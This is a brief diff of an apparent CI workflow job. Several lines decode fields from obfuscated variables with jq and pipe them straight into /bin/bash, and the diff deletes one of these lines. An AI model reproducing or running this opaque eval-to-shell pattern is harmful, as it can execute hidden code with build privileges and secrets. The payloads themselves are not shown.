@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$l03018" | jq -r .o4 | /bin/bash
           printf '%s' "$q5137" | jq -r .k2132 | /bin/bash
           echo $fotg70 | jq -r .aft6037 | /bin/bash
-          echo $y6080 | jq -r .nekyh043 | /bin/bash
           printf '%s' "$q27" | jq -r .f11857 | /bin/bash
 
       - name: Save results
